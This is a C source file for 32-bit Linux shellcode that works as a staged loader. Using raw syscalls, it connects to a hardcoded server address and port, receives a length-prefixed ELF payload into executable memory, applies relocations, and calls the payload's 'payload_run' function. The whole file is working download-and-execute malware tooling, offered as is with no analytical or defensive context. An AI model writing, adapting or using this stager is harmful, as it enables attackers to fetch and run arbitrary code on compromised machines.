// shellcode_linux.c

#include <elf.h>
#include <stdint.h>
#include <stddef.h>

#define SYS_close       6
#define SYS_mmap2       192
#define SYS_socketcall  102
#define SYS_SOCKET      1
#define SYS_CONNECT     3
#define SYS_RECV        10

#define PROT_READ       0x1
#define PROT_WRITE      0x2
#define PROT_EXEC       0x4
#define MAP_PRIVATE     0x02
#define MAP_ANONYMOUS   0x20
#define AF_INET         2
#define SOCK_STREAM     1
#define IPPROTO_TCP     6
#define R_386_RELATIVE  8
#define R_386_32        1
#define R_386_GLOB_DAT  6
#define R_386_JMP_SLOT  7

#define SERVER_IP   0x0100007F
#define SERVER_PORT 0x5C11

struct _sa {
    uint16_t family;
    uint16_t port;
    uint32_t addr;
    uint8_t zero[8];
};

static long _syscall1(long n, long a)
{
    long r;
    __asm__ volatile("int $0x80"
        : "=a"(r) : "0"(n), "b"(a) : "memory"
    );

    return r;
}

static long _syscall3(long n, long a, long b, long c)
{
    long r;
    __asm__ volatile (
        "int $0x80"
        : "=a"(r)
        : "0"(n), "b"(a), "c"(b), "d"(c)
        : "memory"
    );

    return r;
}

static long _syscall6(long n, long a, long b, long c, long d, long e, long f)
{
    long r;
    register long r6 __asm__("ebp") = f;
    __asm__ volatile("int $0x80"
        : "=a"(r)
        : "0"(n),"b"(a),"c"(b),"d"(c),"S"(d),"D"(e),"r"(r6)
        : "memory"
    );

    return r;
}

static void* _mmap(void *addr, size_t len, int prot, int flags)
{
    return (void *)_syscall6(SYS_mmap2, (long)addr, (long)len, prot, flags, -1, 0);
}

static int _strcmp(const char *a, const char *b)
{
    while (*a && *a == *b)
    {
        a++;
        b++;
    }

    return *a - *b;
}

static void *_memcpy(void *d, const void *s, size_t n)
{
    char *dd = (char *)d;
    const char *ss = (const char *)s;

    for (size_t i = 0; i < n; i++)
        dd[i] = ss[i];

    return d;
}

static void _memset(void *d, int c, uint32_t n)
{
    char *dd = (char *)d;
    for (uint32_t i = 0; i < n; i++)
        dd[i] = (char)c;
}

static void *elf_sym(char *base, const char *name)
{
    Elf32_Ehdr *eh = (Elf32_Ehdr *)base;
    Elf32_Shdr *sh = (Elf32_Shdr *)(base + eh->e_shoff);

    Elf32_Shdr *symtab = 0;
    Elf32_Shdr *strtab = 0;

    for (int i = 0; i < eh->e_shnum; i++)
    {
        if (sh[i].sh_type == SHT_DYNSYM)
            symtab = &sh[i];
        
        if (sh[i].sh_type == SHT_STRTAB && i != eh->e_shstrndx)
            strtab = &sh[i];
    }

    if (!symtab || !strtab)
        return 0;

    Elf32_Sym *syms = (Elf32_Sym *)(base + symtab->sh_offset);
    char *strs = base + strtab->sh_offset;
    int n = symtab->sh_size / sizeof(Elf32_Sym);

    for (int i = 0; i < n; i++)
    {
        if (syms[i].st_name && _strcmp(strs + syms[i].st_name, name) == 0)
            return base + syms[i].st_value;
    }

    return 0;
}

static void *elf_load(char *raw)
{
    Elf32_Ehdr *eh = (Elf32_Ehdr *)raw;

    if (!(eh->e_ident[0] == 0x7F && eh->e_ident[1] == 'E' && eh->e_ident[2] == 'L' && eh->e_ident[3] == 'F'))
        return 0;

    Elf32_Phdr *ph = (Elf32_Phdr *)(raw + eh->e_phoff);
    uint32_t min_va = 0xFFFFFFFF;
    uint32_t max_va = 0;

    for (int i = 0; i < eh->e_phnum; i++)
    {
        if (ph[i].p_type != PT_LOAD)
            continue;

        if (ph[i].p_vaddr < min_va)
            min_va = ph[i].p_vaddr;

        uint32_t end = ph[i].p_vaddr + ph[i].p_memsz;
        if (end > max_va)
            max_va = end;
    }

    char *base = (char *)_mmap(0, max_va - min_va, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS);
    if ((long)base < 0)
        return 0;

    for (int i = 0; i < eh->e_phnum; i++)
    {
        if (ph[i].p_type != PT_LOAD)
            continue;

        char *dest = base + (ph[i].p_vaddr - min_va);
        _memcpy(dest, raw + ph[i].p_offset, ph[i].p_filesz);
    }

    uint32_t load_bias = (uint32_t)base - min_va;

    Elf32_Shdr *sh = (Elf32_Shdr *)(raw + eh->e_shoff);
    for (int i = 0; i < eh->e_shnum; i++)
    {
        if (sh[i].sh_type != SHT_REL)
            continue;
        
        Elf32_Rel *rel = (Elf32_Rel *)(raw + sh[i].sh_offset);
        int nrel = sh[i].sh_size / sizeof(Elf32_Rel);
        for (int j = 0; j < nrel; j++)
        {
            uint32_t type = ELF32_R_TYPE(rel[j].r_info);
            uint32_t *target = (uint32_t *)(load_bias + rel[j].r_offset);
            if (type == R_386_RELATIVE)
                *target += load_bias;
        }
    }

    return base;
}

// socket

static int _socket(int d, int t, int p)
{
    long a[3] = { d, t, p };
    return (int)_syscall3(SYS_socketcall, SYS_SOCKET, (long)a, 0);
}

static int _connect(int fd, void *addr, int len)
{
    long a[3] = { fd, (long)addr, len };
    return (int)_syscall3(SYS_socketcall, SYS_CONNECT, (long)a, 0);
}

static int _recv(int fd, void *buf, int len, int flags)
{
    long a[4] = { fd, (long)buf, len, flags };
    return (int)_syscall3(SYS_socketcall, SYS_RECV, (long)a, 0);
}

void shellcode_entry(void)
{
    int sock = _socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0)
        return;

    struct _sa sa;
    sa.family = AF_INET;
    sa.port = SERVER_PORT;
    sa.addr = SERVER_IP;

    _memset(sa.zero, 0, 8);

    if (_connect(sock, &sa, sizeof(sa)) != 0)
    {
        _syscall1(SYS_close, sock);
        return;
    }

    uint32_t payload_size = 0;
    int got = 0;
    while (got < 4)
    {
        int r = _recv(sock, (char *)&payload_size + got, 4 - got, 0);
        if (r <= 0)
        {
            _syscall1(SYS_close, sock);
            return;
        }

        got += r;
    }

    if (!payload_size || payload_size > 32 * 1024 * 1024)
    {
        _syscall1(SYS_close, sock);
        return;
    }

    char *rawBuf = (char *)_mmap(0, payload_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS);
    if ((long)rawBuf < 0)
    {
        _syscall1(SYS_close, sock);
        return;
    }

    uint32_t total = 0;
    while (total < payload_size)
    {
        int chunk = _recv(sock, rawBuf + total, payload_size - total, 0);
        if (chunk <= 0)
        {
            _syscall1(SYS_close, sock);
            return;
        }

        total += (uint32_t)chunk;
    }

    _syscall1(SYS_close, sock);

    char *img = elf_load(rawBuf);
    if (!img)
        return;

    Elf32_Ehdr *eh = (Elf32_Ehdr *)rawBuf;
    Elf32_Shdr *sh = (Elf32_Shdr *)(rawBuf + eh->e_shoff);

    Elf32_Phdr *ph = (Elf32_Phdr *)(rawBuf + eh->e_phoff);
    uint32_t min_va = 0xFFFFFFFF;

    for (int i = 0; i < eh->e_phnum; i++)
    {
        if (ph[i].p_type == PT_LOAD && ph[i].p_vaddr < min_va)
        {
            min_va = ph[i].p_vaddr;
        }
    }

    uint32_t load_bias = (uint32_t)img - min_va;

    for (int i = 0; i < eh->e_shnum; i++)
    {
        if (sh[i].sh_type != SHT_DYNSYM)
            continue;

        Elf32_Sym* syms = (Elf32_Sym*)(rawBuf + sh[i].sh_offset);
        int nsym = sh[i].sh_size / sizeof(Elf32_Sym);
        char *strs = rawBuf + sh[sh[i].sh_link].sh_offset;

        for (int j = 1; j < nsym; j++)
        {
            if (!syms[j].st_name)
                continue;

            if (_strcmp(strs + syms[j].st_name, "payload_run") == 0)
            {
                void (*fn)(void) = (void(*)(void))(load_bias + syms[j].st_value);
                fn();

                return;
            }
        }
    }
}
